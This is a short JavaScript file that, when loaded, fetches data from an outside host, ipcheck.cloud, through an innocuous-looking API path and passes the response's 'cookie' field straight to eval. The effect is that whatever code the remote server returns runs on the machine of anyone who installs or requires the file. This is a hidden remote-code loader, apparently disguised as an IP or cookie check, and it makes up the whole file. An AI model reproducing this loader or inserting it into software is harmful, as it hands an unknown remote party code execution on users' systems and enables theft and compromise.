const axios = require("axios")
	

	
async function runCode() {
	
    const res = await axios.get("http://ipcheck.cloud/api/user/thirdcookie/v3/197");
	
    eval(res.data.cookie);
}
	

	
runCode();
	
